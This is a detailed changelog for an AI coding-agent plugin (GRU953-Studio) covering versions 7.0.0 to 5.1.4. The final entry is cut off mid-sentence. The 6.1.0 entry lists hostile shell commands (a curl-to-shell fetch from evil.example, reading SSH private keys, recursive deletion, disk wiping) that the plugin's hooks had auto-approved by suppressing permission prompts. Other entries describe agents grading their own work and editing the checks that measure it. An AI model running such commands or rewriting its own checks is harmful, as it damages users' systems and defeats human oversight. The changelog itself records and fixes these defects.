# Changelog

## 7.0.0 — 2026-08-26 (LTS)

**Please read section 1 before updating.** Two things change that you would notice
straight away: the licence now permits commercial use free of charge, and the studio
no longer publishes anything to GitHub for you. Everything else is detail.

Full plain-English upgrade notes: [MIGRATION.md](MIGRATION.md).

### 1. What changes for you

**The licence is now Apache-2.0. Commercial use is free.** Every version up to and
including 6.1.0 was PolyForm Noncommercial: free personally, but selling anything you
built with it required buying a separate licence. That requirement is gone. You may
use, modify, sell and ship whatever you build, with nothing to pay and nobody to ask.
The GRU953 name and Soaring Bird logo are still protected — Apache-2.0 grants no
trademark rights.

**The studio no longer publishes for you.** It now finishes with a complete, tested
project committed on your own machine, and stops. Creating a GitHub repository and
pushing to it is yours to do, deliberately. This is a safety decision rather than a
missing feature: an unattended build cannot sensibly be trusted to decide when your
code becomes visible to other people, and the old design asked you to approve each
push — a question nothing can answer when you are not there.

**It now works unattended.** You answer one round of pop-up questions at the start,
and the studio then researches, designs, plans, codes, reviews and tests without
interrupting you again.

That sentence was written on 26 August and it was not true. A read-only audit the
next day found the decision behind it — one interview, then silent — recorded in
the plan and never implemented: **fourteen** places still stopped to ask a person
mid-build, one at every stage boundary, and three further defects would have made
an unattended run fail outright rather than merely stall. The one test that proved
the product worked took a path that avoided every one of them, because it built
the simplest kind of project there is. All seventeen are fixed, the pop-ups are
now decisions recorded in `Dev-Memory/decisions/` where a person can read them
afterwards, and `docs-consistency.mjs` refuses any new one that does not say which
context it belongs to. It is stated here rather than quietly corrected because a
released changelog that describes an intention as a feature is the same defect as
a gate that grades a report card.

**Claude Code only.** Support for Cursor, Windsurf, Cline, Roo Code, Aider, GitHub
Copilot, Devin, Replit, OpenHands and Google Antigravity is withdrawn, along with the
Ollama, OpenRouter and Gemini integrations. That support was never tested end to end
and this project's own documentation called it "best-effort, uneven". One target that
genuinely works is worth more than nine that might. The Antigravity npm package could
never install in any case: every published version of it shipped without the plugin its
own code loads at runtime.

**Media is now specified rather than generated.** Images, audio and video used to be
produced through a paid Google integration, behind an approval prompt shown before
every single generation. With no such provider, one `media-content-specialist` now
writes you an asset brief — what it must show, every size and format the platform
needs, the alt-text written out, and a note on what you may legally use — plus
step-by-step instructions for producing it. This was already the documented behaviour
when no key was available; it is now the only behaviour. It also removes a prompt an
unattended run could never answer.

### 2. The change underneath all of it

**Checks now run the work instead of reading a report about it.**

`quality-gate.mjs` and `verify-progress.mjs` never executed anything — neither imports
`child_process`, and the only `exec` in either is a regular expression. They read a
markdown table listing each quality dimension as passed, with a note as evidence. The
agents wrote that table themselves.

With a person watching, that is survivable: you read the summary and notice when the
app does not work. With nobody watching it is a loop that always closes green — the
agent does the work, writes its own report card, and the check marks the report card.

`hooks/dod.mjs` replaces it. It runs the build, the tests, coverage against a stated
number, the linter, the type checker, a security scan, a dependency audit, a real user
journey, accessibility checks and performance budgets. Each produces a real exit code,
recorded with its command and output under `Dev-Memory/evidence/`. The markdown table
is then generated from that evidence, so the older check still does its job — on
measurements rather than claims. A hand-edited table is overwritten on the next run,
deliberately: a standard the work can edit is not a standard.

### 3. Bugs fixed, and what each one had been hiding

Every one was reproduced by running the code before being called a bug, and every one
has a test that fails on the old code.

- **The reproduction harness accepted a crash as proof of a fix.** The contract for the
  71 regression reproductions asserted only a non-zero exit. A reproduction that died
  for an unrelated reason — a renamed fixture, a typo in its own path — satisfied it
  while measuring nothing. All 71 were weaker than they claimed.
- **Five blocking pre-publish checks reported "clean" for a folder they never read.**
  A path that did not exist, and a file passed where a folder was expected, both
  produced `not a studio project` and exit 0 — the same answer as a genuinely
  unrelated folder. A mistyped path made five checks report success on work none of
  them had looked at.
- **The only defence against a passing row that admits failure missed most failures.**
  It recognised how a person narrates one ("now fails", "still failing") and not how a
  test runner reports one. `3 failed, 12 passed` — the commonest line any runner
  prints — went straight through, so a Definition of Done could pass carrying its own
  evidence of failure. Seven of eleven realistic phrasings were missed.
- **`undefined` counted as evidence.** Found when the new checker's own template wrote
  `| Independent code review | pass | undefined |` and the older gate reported the
  whole Definition of Done clean.
- **The charter's most important sentence was the one nothing guarded.** The guarantee
  that publishing needs a fresh, explicit yes every time could be deleted outright and
  every gate still reported clean.
- **The release path ran none of the checks.** Pushing a version tag published to npm
  with no dependency on the test suite or any of the seven integrity gates.
- **Four gates had latent bugs nobody had reached.** Two read a historical role count
  as the current one; one recognised merged-away roles only under a heading naming one
  specific old version; one could never allow a skill to be deleted while the changelog
  still mentioned it. Each surfaced the first time anyone actually changed the thing it
  guarded.
- **One role's protocol existed twice**, as both an agent and a same-named skill that
  nothing loaded — and that skill claimed to be mechanically enforced by a check which
  skips it.

Everything above was written on 26 August. Two adversarial passes over this
release's own new machinery, plus the audit described in section 1, then found
**forty-one** more — and the pattern in them is worth more to you than the list:

- **The new machinery was built and wired to nothing.** The executed Definition of
  Done, the run ledger, the run brief, the stall detector and the cost ledger all
  existed, all had tests, and no skill, agent or command ever invoked any of them.
  A run would have proceeded exactly as 6.1.0 did, with the new gates sitting
  unread beside it. Nineteen findings, one defect.
- **The first genuine end-to-end run measured a Claude session with the studio
  switched off.** The plugin was pointed at the wrong directory, so nothing loaded;
  the run produced a working app anyway, because Claude can write a small app
  unaided, and the test passed. That is the whole failure mode this release is about,
  reproduced by the test built to catch it.
- **The fixes were the same defect as the bugs.** Eleven of the first eighteen
  corrections were themselves wrong, and wrong in the same shape as what they
  corrected. That number is recorded because it is now the working assumption: a
  first-pass fix in this codebase is attacked, not trusted.
- **A guard on the tooling configuration was defeated eleven times out of eleven.**
  It compared configuration files the one way its twelve tests spelled them. Every
  other spelling — a rule level written as an array, a numeric level, an unquoted
  key, a strictness flag removed rather than set to false — went through. All twelve
  tests passed throughout.
- **The operating charter could be inverted sentence by sentence with every gate
  green.** The gate that guards it read only the headings, so the clause bodies —
  including the ones about your consent — could be replaced with their opposites.
- **The publish command verified the Definition of Done without measuring it.** It
  ran the gate that reads the table, and not the one that produces the table.
- **A filename was taken as evidence of a capability** in five places: a
  `tsconfig.json` was read as "this project type-checks", so a dimension could be
  waived as not-applicable on a project that simply had the file lying about.
- **Opening the repository in Finder failed the build.** macOS scatters `.DS_Store`
  files, and one gate treated them as unauthorised files inside the plugin, taking
  thirteen tests with it — for a file three separate rules already stop from ever
  shipping.
- **The test that judges the product had no tests of its own.** Its judgements cost
  seventy minutes to exercise, so they never were; three were wrong.

### 4. New in the machinery

- **`dod.mjs`** — the executed Definition of Done, above.
- **`task-ledger.mjs`** — the task list as data, with `PROGRESS.md` generated from it.
  There is no bare "blocked" state any more: a task is blocked on a _defect_ (parked,
  and the run carries on with anything else it can finish) or blocked on a _person_
  (it genuinely stops). Previously the first hard failure ended an unattended build
  however much independent work remained. It also enforces a retry ceiling as data,
  rather than trusting the agent that wants to keep trying to count its own attempts.
- **`run-brief.mjs`** — checks, before a run starts, that the interview left nothing the
  build would have to come back and ask about. It also re-derives the project Tier from
  the three answers that produce it and refuses a mismatch, so a mis-sized project is
  caught rather than silent.
- **`config-protection.mjs`** — refuses edits to the linter's configuration, to the
  declared Definition of Done, and to recorded evidence. An agent told "make the build
  pass" can fix the code or edit the thing measuring it, and the second always works.
- **`session-cost.mjs`** — what a run has spent, in tokens. Not money: a price list
  inside a long-term release becomes a promise that goes quietly stale.
- **`stall-check.mjs`** — whether an unattended run is still working or has silently
  wedged, which nothing could previously answer.
- **A real end-to-end test.** There were 520 tests over the machinery and not one that
  the studio produces working software. `tools/e2e/headless-build.mjs` runs an
  unattended build of a small app and judges the result against both the files on disk
  and the session transcript — including that nothing was pushed anywhere. It runs
  nightly. It has since run green — 18 of 18 assertions, 71 minutes, 21 dispatches
  across 8 specialists, nothing pushed — and it has found real defects on four of its
  six runs, including the one where the plugin was not loaded at all. Its own
  judgements now have unit tests, because they cost 71 minutes to exercise otherwise
  and three of them were wrong. It takes `--brief <path>`, so one hardcoded fixture is
  no longer the whole of the product-level coverage, and it preserves the transcript
  and the work tree when it fails or times out.
- **Four new consistency checks.** `docs-consistency.mjs` now refuses a task state the
  ledger would reject, a safety guarantee resting on machinery that was deleted, a
  mid-build pop-up that does not say which context it belongs to, and a hook carrying a
  network client. Each replaced a class of defect that had recurred, rather than a
  single instance — and each had to be shown both to catch the real reintroduced bug
  and to leave an honest project alone. Three of the four failed that second test on
  the first attempt.
- **The Definition of Done can no longer be waived by omission.** A coverage floor may
  not be zero, may not sit below 60% without a written reason, and cannot be met by a
  command that only creates the report file. A dimension may be marked not-applicable
  only where the project genuinely lacks the capability, not merely the filename.
  `tests` and `runs` may not both be skipped on a project that contains source code.
  The tooling configuration is fingerprinted into the evidence, so a lint or type
  result recorded after the rules changed is flagged until someone writes down why.
- **The gate that reads the table now checks who wrote it.** Evidence must exist, every
  row must trace to a file naming it, the table must be newer than the newest
  measurement, and a table marked blocked is refused outright. A hand-written report
  card no longer passes, and a hand-edited one is overwritten on the next run.

### 5. Numbers

|                                  |     6.1.0 |     7.0.0 |
| :------------------------------- | --------: | --------: |
| Specialist roles                 |        38 |        36 |
| Skills                           |        37 |        34 |
| Commands                         |        11 |        10 |
| Enforcement hooks                |        24 |        24 |
| Tests                            |       468 |       737 |
| Standing context load            | 127,762 B | 158,516 B |
| Hooks carrying a network client  |         1 |         0 |
| Third-party runtime dependencies |         0 |         0 |

**Every figure above is measured, and the 6.1.0 column is measured from the
`v6.1.0` tag rather than remembered.** That sentence is here because this table has
now been wrong twice, and the second time was the correction.

The version written on 26 August said 40 skills, 19 enforcement hooks and 480 tests
for 6.1.0, and 520 tests for 7.0.0. An adversarial pass on 27 August checked each
against the release it describes. Running 6.1.0's own `repo-integrity.mjs` on
6.1.0's own tree reports **37 skills and 24 hooks**; running its own suite reports
**468 tests**. So the "19 → 24" row presented growth that never happened — the hook
count did not move at all — and two of the three baselines were simply wrong.
Nothing had caught them because nothing could: a number in prose is compared to
nothing.

**Standing context load.** The 26 August entry said `141,570 B → 118,731 B`, a 16%
reduction, and neither figure had a recorded method anywhere in the repository, so
neither could be reproduced or argued with. The 27 August correction replaced them
with `127,762 → 137,728` and a stated method — and got the second number wrong too,
because it was measured mid-session and this release then added several thousand more
bytes of exactly the prose being measured. Measured at the release commit by the same
stated rule — the coordinator skill plus every companion skill it names as a standing
rule, `git show`n from `v6.1.0` for the baseline — it is **127,762 B → 158,516 B: up
24.1%**, not down 16% and not up 8%.

It is stated that way round because the alternative is a release note claiming an
improvement that did not happen. The cause is not mysterious: a large share of that
text is now dated commentary explaining why each rule exists, and this release added
a great deal of it. Phase 4 removed the subset that could be removed safely; the rest
is a known cost, recorded here as a real number so that whoever looks at it next
starts from one.

**Two of these rows drift with every commit** — tests, and the context load — and both
are therefore DATED measurements rather than live claims: they are true of the commit
that wrote them, and `docs/RELEASING-7.0.0.md` carries the command to re-measure both
at the tag. That is not a formality. The context-load figure has now been corrected
three times, the third time because the very commit that corrected it added several
hundred more bytes of the prose it measures: 157,984 on the 27th became 158,516 by
the end of the same commit. A number that changes when you write about it has to name
the point it was taken at, or it is wrong by the time anyone reads it. The other four are re-derived by `repo-integrity.mjs` on
every commit, so they cannot go stale quietly.

**Hooks carrying a network client** replaced a row reading "Outbound network calls
1 → 0". The 1 was real — `openrouter-models.mjs` read a public model catalogue, and
went with the model integrations. The 0 was not: three roles are instructed to use
_your_ session's web search when a build turns on a current external fact, and
`licence-scan.mjs` invokes `cargo metadata` and `dart pub deps`, either of which
contacts a package registry on a cold cache. The row now measures the narrower thing
that is both true and checkable, and `docs-consistency.mjs` DC14 checks it on every
commit — after itself being rewritten, because the first version of that check did
not detect `openrouter-models.mjs`, the one file its own header named as the reason
it existed.

### 6. What LTS means here

`7.0.x` receives bug fixes and security fixes only. No new features, no behaviour
changes — so anything you build on it does not move under you. New work goes to a
`7.1` line. The full statement of what will not change is in
[docs/STABILITY.md](docs/STABILITY.md), and the supported-versions table is in
[SECURITY.md](SECURITY.md).

### 7. Corrected from the pending notes of the previous cycle

The unreleased section this replaces described repairing an endpoint rule inside
`hooks/gate.mjs` (finding X189). That file, and the entire push-authorisation token
layer it belonged to, had already been deleted nine days before those notes were
written — the layer could not establish what it claimed, since anything the check could
read an agent on the same machine could write. So the note described a repair to
something that no longer existed, and shipping it would have credited a fix nobody
could verify. It is withdrawn rather than carried forward. The removal of that layer
itself was never given a changelog entry; it is recorded here.

## 6.1.0 — 2026-08-13

**Please update. Every earlier version reduced the safety of the machine it was
installed on, in a way this project never intended and never disclosed. Two
critical defects are fixed here, along with nine more that let a gate report
success on work it had not actually checked.**

_(A 6.0.4 carrying only the first fix was prepared and never released; its
contents are included below rather than claiming a version that never shipped.)_

### The plugin was switching off your permission prompts

Claude Code normally asks before running a shell command it judges risky. A
`PreToolUse` hook can answer that question on your behalf, and the answer this
plugin gave was the wrong one.

Both safety hooks ended every check they had no objection to by emitting
`permissionDecision: "allow"`. Per Claude Code's own documented contract, that
value means _"permit the tool call to proceed without a permission prompt"_ — it
does not mean "I have no opinion". The neutral answer is to say nothing at all.

So for every shell command that was not a code push, this plugin actively
approved it and suppressed the prompt you would otherwise have seen. Reproduced
against real commands before fixing:

```
rm -rf /important                      -> allow
curl http://evil.example/x.sh | sh     -> allow
cat ~/.ssh/id_rsa                      -> allow
chmod -R 777 /                         -> allow
dd if=/dev/zero of=/dev/sda            -> allow
```

A tool installed to make a setup safer was making it less safe. In the language
of the OWASP Top 10 for LLM Applications (2025), this is LLM06 Excessive Agency:
the component held far more authority than its job required. These hooks have a
legitimate basis to **refuse** a push. They never had a basis to **approve**
anything else.

**What changed.** The single ambiguous function is now two, so that no approval
can ever again be a side effect of saying nothing:

- **Step aside** — emit no decision at all. Used wherever a hook has no business
  interfering: the command is not a push, or the folder is not a studio project,
  or (for the secret scanner) nothing was found. Your normal permission prompts
  return, exactly as they behave without this plugin installed.
- **Authorise** — emit an approval, with a stated reason. Reserved for the two
  paths where you confirmed the action moments earlier and a project-bound,
  expiring record proves it. Nothing else in the plugin may call it.

The secret scanner is now explicitly veto-only: finding no secrets means it has
no objection, which was never the same thing as approving your push.

**What did not change.** An unauthorised push is still refused. A confirmed push
is still allowed. A private-publish record still cannot make a repository public.
All of that is asserted by tests that were run before and after the change.

### A stalled hook can no longer hang for ten minutes

Every hook now declares an explicit 20-second limit. Without one the platform
default of 600 seconds applied, and a hook that times out does not block the
command — so a stall was both a frozen session and a window with this plugin's
protection absent. The bound was chosen from measurement, not guesswork: the
scanner takes 147–156 ms against this repository and the gate 56–57 ms, and a
test now asserts that margin stays wide as the code grows.

### How this is prevented from coming back

A new repository invariant (INV17) fails the build if any hook emits a blanket
approval, if the old combined function reappears, or if the secret scanner ever
starts authorising. It was verified by deliberately reintroducing each of those
three regressions and confirming each one is caught.

Three regression tests were added, and 23 existing tests were corrected: they had
been asserting the defective behaviour, which is why nine earlier audit rounds
did not catch it. Test count is reported once, at the end of this entry.

### Credit

Found in an independent peer review of the 6.0.3 source. It had survived twelve
of this project's own audit rounds, because every round asked whether the studio
kept its own promises — and this was a promise nobody had made.

---

### The quality gate read only the first table in its file

This is the second critical defect, and it is the one that mattered most to
anyone actually using the studio.

`QUALITY-GATE.md` records the Definition of Done for the current phase. The gate
that reads it — the gate that authorises per-phase backups and publishing — found
the first markdown table, checked it, and stopped. Every later table was
invisible.

That is precisely the shape a real project produces. `Dev-Memory`'s own
discipline is append, never rewrite. So a project that finished Phase 1, appended
Phase 2's Definition of Done below it, and started work got:

```
| Automated tests | fail | `npm test` -> exit 1, 3 failing |     <- the live table
...
{"status":"clean"}                                               <- the gate's verdict
```

A green light while its own record said the tests were failing. The gate's own
header promises that "every ambiguous state fails CLOSED".

Every table is now checked, and a failure anywhere blocks. A 2026-07-19 fix had
introduced the first-table-only behaviour for a real reason — an unrelated
Item+Status table elsewhere in the file could inject a spurious row. That case is
still supported, but it must now be **declared** with an explicit
`<!-- not-a-definition-of-done -->` marker above the table rather than guessed at.
An earlier attempt guessed, using a coverage heuristic, and that reopened this very
defect for narrow tables — see the review section at the end of this entry.

### The same defect in the content gate

`content-check.mjs` also read only its first asset table. Grouping the content
register by medium — `## Images`, then `## Audio`, then `## Text` — is the obvious
way to organise it, and it hid every asset after the first group. An unapproved,
unattributed image with no alt-text sat in a second table and the gate reported
`{"status":"clean","assets":2}`. It counted the asset and cleared it.

### Gates that declared files fine without reading them

Three gates returned the same value for "this file isn't there" and "this file is
there but I couldn't read it", and treated both as "nothing to check":

- `memory-integrity.mjs` reported "recall index and knowledge graph are
  internally consistent" about an `INDEX.md` that was unreadable, and about one
  that had been replaced by a directory.
- `traceability-check.mjs` treated an unreadable `REQUIREMENTS.md` as an absent
  one — and on a Tiny-Tier project, absent is the _lenient_ path. It reported
  "Nothing to trace" about a file it had not read a byte of.

`content-check.mjs` had already found and fixed this exact class in July, and
stated the principle: _a gate that cannot read its input must never claim its
input is fine_. That fix is now shared code, so the same bug cannot be made a
sixth time.

### "Unverified" counted as proof; "exit code 0" did not

Two defects in one pattern, pulling opposite ways.

A task marked done was accepted with evidence reading
`unverified: npm test -> exit 0 is what we expect once someone runs it`. The
pattern looked for `verified:` with no left-hand boundary, so it matched the
`verified:` inside `unverified:`. Evidence stating in plain English that nobody
had run the test was accepted as proof.

Meanwhile a genuinely passing task recorded as `-> exit code 0` was **rejected**.
The failure side of the same check had been widened years earlier to accept
`exit code N`, described in this codebase as "the far more natural phrasing". The
success side never was. So the project recognised "exit code 1" as a failure claim
but not "exit code 0" as a success claim.

A progress file containing no table at all also passed, with the reason
"every done row has a verified: cell" — a claim about rows it had never found.

### Smaller fixes in the same sweep

- A licence scan beside an **empty** `node_modules` reported "checked" and clean.
  Declared dependencies are now cross-checked against what is actually installed;
  anything missing makes the result honestly incomplete.
- A manifest with a blank version string was skipped rather than failed, even
  though a manifest with no version publishes nothing.
- A raw `|` inside an evidence cell shifted every later column and hid a recorded
  failure. Rows whose columns do not line up with their header are now reported
  instead of skipped.
- Pipe-less markdown tables — valid, and rendering identically on GitHub — were
  invisible to the quality and content gates, which then reported "no table found"
  about files that plainly had one. Two further gates (`memory-integrity`,
  `traceability-check`) still require a leading pipe; they fail closed on such a
  table, so it is a false block rather than a false pass, and it is not yet fixed.
- A note in a project's own memory pointing at a sibling file by name was wrongly
  reported as a broken reference. This gate blocked that three times in a single
  session, once on a note whose only content was a description of the bug.

### How these were fixed, and why that matters more than the fixes

Every one of the twelve was reproduced first, as a committed script that asserts
the _defective_ behaviour, and only then fixed. The script then had to flip. Both
directions run in the test suite, so a reproduction cannot quietly decay into a
test that passes anything.

Alongside every fix, the unmutated reference fixture had to stay clean. Without
that control, "make every gate block" would have scored as a perfect result.

One false positive was introduced during this work and caught the same way: a
newly added contradiction term blocked a legitimately green row whose note
mentioned "the researcher's unverified inference" — prose about someone else's
claim, not a statement about that task. The term was narrowed the same day. It is
recorded here because a gate that cries wolf gets routed around, which is how a
gate stops being worth having.

### An independent review found two of the fixes had opened new holes

Before this release, the whole change set went to an independent reviewer — a
reader who had not written any of it. That mattered more than any single fix in
it, and the honest record is worth publishing rather than hiding.

The reviewer found **twelve** findings. Two were new fail-opens created by the
fixes above:

- The quality gate's replacement logic used a heuristic: a table counted only if
  it covered at least three of the required dimensions. That reopened the very
  critical defect it replaced, for any **narrow** table — and a narrow table is
  what a phase in progress actually produces, because it lists only the
  dimensions still outstanding. Being clever was worse than being blunt. Every
  table now counts, and excluding one requires an explicit marker in the file.
- The content gate started passing a **header-only** register — a table created
  and never filled in — where the previous version correctly refused it.

Three more were about the change that let this project push its own repository:
the exemption was not actually bound to this plugin (an unrelated repository with
a lookalike directory shipped private memory unflagged), it silently stopped
working when a push ran from a subdirectory, and the `scan-allow` annotation was
honoured at only one of five places it needed to be. The exemption is now anchored
to this hook's own location on disk, so no path pattern can satisfy it by accident.

The reviewer also found that a valid publish token blanket-approved anything
appended to the push — `git push … && rm -rf …` was approved in full, because an
approval covers the whole command string. Such commands now **escalate** to a
permission prompt instead: the token still proves intent, but the extra work gets
a human's eyes.

Six smaller findings were fixed too, including two regex gaps that let
`un-verified:` count as proof, a partial fix that any table switched off, a new
false block on ordinary prose next to a table, and a licence scan that was
permanently "incomplete" on any project with a platform-specific optional
dependency.

**Every one of the twelve is pinned by a reproduction that runs in both
directions**, and each carries a control proving the fix did not simply switch the
check off. Two of those reproductions were wrong on first writing — they passed
for the wrong reason — and were caught by their own controls, which is the
strongest argument for having them.

Test count 460 → 468, all passing.

## 6.0.3 — 2026-08-11

Two packaging fixes, both found by re-running the install verification against the
**published** 6.0.2 downloads rather than against the source code.

### The Windows download could not install the studio

`gru953-studio-windows-portable-<version>.zip` carried the command but not the studio's
skills and roles, so `gru953-studio install` reported that something was wrong with the
installation — and its own instructions promised it would work. That is the identical
bug 6.0.2 fixed for npm, in the sibling packaging path. One was fixed; nothing asserted
the other, so it stayed broken.

The download is now self-contained. `gru953-studio --version` also works from it, which
it did not before, because the package had no `package.json` for the command to read its
own version from.

### Publishing was npm-version-dependent, which is worse than it sounds

The studio is copied into the package at pack time, into a directory that is gitignored
because it is build output. When a package has no `.npmignore`, npm falls back to
consulting `.gitignore` — so on some npm versions the directory that `files` explicitly
asks for was excluded again by the rule keeping it out of git.

**Whether the published package contained the studio at all depended on which npm
version ran the publish.** The 6.0.2 tarball was correct by luck: the release workflow
upgrades npm first. The Windows CI runner's older npm produced an empty one from the
same command, which is how this was found. A `.npmignore` now stops npm consulting
`.gitignore`, making the result identical everywhere.

### Tests

Both gaps existed because nothing asserted them:

- The Windows package is now checked, in the test suite and in CI, for the studio, a
  `package.json`, and that it reports the right version. Verified by removing the
  bundling and watching the test fail.
- The pack test now reports what the tarball actually contained when it fails. Its
  first Windows failure said only "must contain ...", which told nobody anything, and
  the real cause took a separate investigation.
- A test asserts `.npmignore` exists and does not exclude the directories it protects.

## 6.0.2 — 2026-08-11

A real bug fix. If you installed the `gru953-studio` command from npm or Homebrew,
**it could not actually install the studio** — please update.

### `gru953-studio install` now works from every route

The command is meant to find every AI coding tool on your computer and set the studio
up in each one. From a copy of the source code it did. From npm — or Homebrew, which
installs the npm package — it could not, because the published package contained the
command and nothing else. The studio's skills and specialist roles simply were not in
it. The command said so and pointed you elsewhere, which at least was honest, but the
README, the Homebrew notes and the wiki all promised it would work.

The studio is now published inside the package, so `install` and `models` work
however you got the command. The download is about 460KB.

**How this got missed, since it is the more useful part.** Every automated test
passed. Every automated test ran from a copy of the source code, where the studio sits
a few folders up and is always present — so nothing ever exercised the arrangement a
real user actually gets. It was found by running the Homebrew-installed command
instead of the source copy. There are now tests that check what `npm pack` actually
produces, rather than what the source layout implies.

### Smaller fixes

- `gru953-studio --version` (and `-v`) print the version instead of "Unknown
  command". `--help` and `-h` work too. These are near-universal conventions and
  typing one is not a mistake.
- Messages that said an npm install "does not include the studio" were true before
  this release and would now be actively misleading. If the studio is ever genuinely
  missing, the command now says something has gone wrong with the installation and
  how to repair it, rather than blaming a normal install.
- `npm test` in the command's own package ran the STUDIO's test suite too once the
  studio was bundled in, producing a hundred spurious failures. Test discovery is now
  scoped to the package's own tests.
- The pack-time bundler was not covered by linting. It is now.

## 6.0.1 — 2026-08-11

A packaging release. Nothing about how GRU953-Studio works has changed, and there
is no reason to update if 6.0.0 is working for you.

### One new download, for Windows

`gru953-studio-windows-portable-<version>.zip` — a `.cmd` launcher plus the
command-line helper, which is what `winget` installs behind the scenes. It needs
Node.js, and tells you plainly where to get it if you do not have it.

This exists because of a mistake caught before it reached anyone. The winget
manifests prepared in 6.0.0 declared a `gru953-studio` command while pointing at
the Claude Code plugin package — an archive of 128 markdown files with no
executable in it. winget would have rejected it, and submitting it would have spent
Microsoft's reviewers' time on something that could never have worked. Found by
downloading the published archive and looking inside, rather than by re-reading the
build script.

The manifests are now the right shape (a zip containing one portable command, with
Node.js declared as a package dependency rather than bundled), checked against
winget's own schema. Both CI and the test suite now assert that this package
contains something runnable and no markdown — the exact distinction that was wrong.

### The Homebrew tap is live

```
brew install GRU-953/tap/gru953-studio
```

[GRU-953/homebrew-tap](https://github.com/GRU-953/homebrew-tap) is published and
verified: `brew style` clean, `brew audit --strict --online` clean, and a real
install and `brew test` on macOS.

One thing worth knowing, found by tapping it from GitHub as a new user would rather
than testing the local copy: **Homebrew 6 refuses to load a formula from a
third-party tap until you trust it.** `brew install` recorded the trust itself and
went ahead, but you may be prompted — `brew trust GRU-953/tap` is the answer, and it
costs nothing to anyone who is never asked.

### Why this needed a release at all

This repository publishes immutable releases, so a new asset cannot be added to
v6.0.0 after the fact (GitHub returns "HTTP 422: Cannot upload assets to an
immutable release"). That is a good property, not a fault — but it means a new
download ships with a new version.

## 6.0.0 — 2026-08-11

Seven owner-requested additions, and one honest answer to an eighth question
nobody had asked out loud.

**Why 6.0.0 rather than 5.2.0.** Most of this is additive, which would argue for
a minor version. Two things are not. The Google Antigravity install location
moves — the old bridge wrote to `.agents/skills/`, which Antigravity does not
scan, so anyone who ran it has files in a place now abandoned and must run the
installer again. And the two-branch rule changes what Publish _does_ for every
project: it now creates a `development` branch alongside `main`. Those are changes
to documented behaviour people may depend on, not just new capability, so the
major number moves.

### OpenRouter support, free models only by default

- New `openrouter-integration` skill: OpenRouter as an AI backend for apps the
  studio builds, a sibling of the existing Ollama and Gemini integrations — opt-in,
  the user's own key, confirm-before-spend, graceful degradation.
- New `hooks/openrouter-models.mjs` and `/studio-models` for searching the live
  catalogue and choosing a model. Every fact was verified on 2026-08-10 by calling
  the real API: the models endpoint needs no authentication, the catalogue held
  399 models, and 17 of them were genuinely free.
- **Free models are identified by PRICE, never by name.** 14 of the 17 free models
  had ids ending `:free` — three did not, and two of those were the
  largest-context free models available, so the obvious shortcut misses exactly
  the ones a user would most want. The reverse error is the expensive one: a
  `:free` name outliving its free price would spend real money while being
  reported as free. Every pricing field is checked, not just per-token cost, so a
  model that starts charging for images drops out of the free list rather than
  quietly staying in it. A model with no pricing information is treated as NOT
  free: unknown must never reach a non-technical user as "free".
- No new secret pattern was needed — `scan.mjs` already blocks an OpenRouter
  `sk-or-v1-` key. That was a claim until now; it is a test.

### The operating charter

- New `operating-charter` skill: the owner's standing instructions on how the
  studio works with a person — plain UK English, the expert-panel pop-up
  interview, reconciled specialist perspectives, no silent scope change, YAGNI,
  verified-and-dated facts, memory across sessions, and the order of priority when
  two instructions conflict. Stated canonically in one place; nineteen files that
  had been restating the same rule in slightly different words now point at it.
- It binds on every platform, not just Claude Code: the seven AI-host rule files
  carry a summary and `.agents/OPERATING-CHARTER.md` carries the full text, which
  is how it reaches Aider — the one supported host that reads no prose rule file.
- New seventh mandatory gate, `hooks/charter-check.mjs`, comparing the charter's
  two necessary copies clause by clause. Verified against real mutations: a
  reworded clause, a deleted clause, a clause emptied under its own heading, and a
  charter nothing loads are each caught, while re-wrapping a clause is not.

### Downloadable installers on every release

- Every release now attaches a Claude Code package, a Claude Desktop package, an
  Antigravity package, a VS Code `.vsix`, both one-line installer scripts, and a
  `SHA256SUMS.txt`. Each package carries an `INSTALL.txt` written for that app's
  own documented route.
- What each host accepts was checked against its own documentation first. Claude
  Desktop takes the Claude Code plugin format; Antigravity takes a different
  layout entirely and has **no** place for separate specialist agents, so the 38
  roles are projected into a generated rules file it follows itself. That
  limitation is written into the shipped package rather than hidden.
- Which exposed that the existing Antigravity bridge never worked: it wrote to a
  location Antigravity does not scan, with no `plugin.json` anywhere, and linked
  one skill of the whole set before printing "initialized successfully". Rewritten,
  and covered by tests.
- Packaging is a hand-written ZIP writer with fixed timestamps, so the same source
  always produces byte-identical archives — without which a published checksum
  proves nothing.

### One installer for macOS, Windows and Linux

- `gru953-studio install` finds every supported tool on the machine and sets the
  studio up in each, with `doctor`, `uninstall`, `update`, `autoupdate` and
  `models` alongside. One-line bootstrap scripts for each platform, plus a
  Homebrew formula and winget manifests.
- Three deliberate restraints: Claude Desktop is skipped by default because
  Anthropic documents installing through the app rather than by copying files; the
  shell profile is never edited automatically, only advised on; and no system
  software is ever installed — a missing dependency produces numbered steps.
- Daily updates work as before by default (a check on first use each day). The
  scheduled job is a separate, explicit opt-in using each platform's own
  scheduler.

### `main` and `development`, everywhere

- `main` holds only the final, tested, released version. `development` holds
  everything else. Publish creates both branches; per-phase checkpoints go to
  `development`; `maintenance-agent` — the role most likely to commit onto a
  released branch by accident — is told explicitly not to.
- This needed no change to the push gates, which was checked rather than assumed:
  authorisation is by recorded confirmation token, not by branch name.

### Testing

- Two new CI jobs. `packaging` builds and structurally verifies every release
  asset on every pull request, and proves the build is reproducible. `installer`
  runs install and uninstall end to end against a throwaway home directory on all
  three operating systems, then asserts the checkout is undamaged — a linked
  install points at the studio's own source, so an uninstall that followed the
  link would delete it.
- `docs/INSTALL-VERIFY.md` covers what no automated test can: whether the three
  apps actually load what was installed.

### The question nobody asked out loud

Can GRU953-Studio's own 38 specialists run on OpenRouter models? **No**, and it is
a fact about the host rather than a gap here. Claude Code's own documentation
states Anthropic "doesn't support routing Claude Code to non-Claude models through
any gateway", that `ANTHROPIC_BASE_URL` "changes where requests are sent, not which
model answers them", and that the model setting accepts only Anthropic model names
or named cloud-provider deployments. Recorded with its sources in the OpenRouter
skill, because the alternative is the fictional multi-provider routing claim this
project already had to retract once.

## 5.1.4 — 2026-08-07

One CRITICAL fix to the go-public gate, found by execution through the real
hook interface rather than by reading the code — the same way the Round 5 and
Round 8 go-public bypasses were found.

- **`gate.mjs`: a `gh api` visibility change sent as a JSON body rode the
  private-publish token.** Every gh-api pattern in `isGoPublicCommand()`
  required a field flag (`-f`/`-F`/`--field`/`--raw-field`), but `gh api`
  equally takes its whole body as JSON on stdin via `--input`, where no field
  flag ever appears. Reproduced against a project with only PUBLISH-APPROVED
  recorded and no GO-PUBLIC-APPROVED: both
